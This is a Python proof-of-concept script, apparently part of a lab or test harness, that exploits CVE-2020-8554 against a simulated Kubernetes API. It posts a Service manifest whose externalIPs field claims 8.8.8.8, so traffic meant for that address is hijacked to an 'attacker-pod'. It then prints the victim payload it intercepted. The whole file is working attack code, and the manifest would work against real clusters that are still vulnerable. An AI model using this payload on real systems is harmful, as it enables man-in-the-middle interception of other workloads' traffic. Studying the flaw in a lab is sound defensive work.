import time
import requests

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    print("[*] Phase 1: Intercepting Traffic via CVE-2020-8554 External IPs Service")
    service_spec = {
        "apiVersion": "v1",
        "kind": "Service",
        "metadata": {"name": "mitm-service"},
        "spec": {
            "selector": {"app": "attacker-pod"},
            "ports": [{"port": 80, "targetPort": 8080}],
            "externalIPs": ["8.8.8.8"]
        }
    }

    try:
        resp = requests.post(f"{url}/api/v1/namespaces/default/services", json=service_spec, timeout=10)
        if resp.status_code == 201:
            print("[+] External IPs hijack service deployed successfully!")
            print(f"[+] Hijacked route info: {resp.json()}")
        else:
            print(f"[-] Service creation failed with status code {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return

    print("[*] Phase 2: Simulating victim pod traffic to 8.8.8.8 (intercepted by attacker)")
    try:
        resp = requests.post(f"{url}/simulate/victim-traffic", json={"destination": "8.8.8.8", "payload": "DNS query: example.com"}, timeout=10)
        if resp.status_code == 200:
            result = resp.json()
            print(f"[+] Traffic interception confirmed!")
            print(f"[+] Victim sent to: {result.get('intended_destination')}")
            print(f"[+] Traffic received by: {result.get('actual_receiver')} (attacker-pod)")
            print(f"[+] Intercepted payload: {result.get('intercepted_payload')}")
        else:
            print(f"[-] Traffic simulation failed: {resp.status_code}")
    except Exception as e:
        print(f"[-] Traffic simulation request failed: {e}")
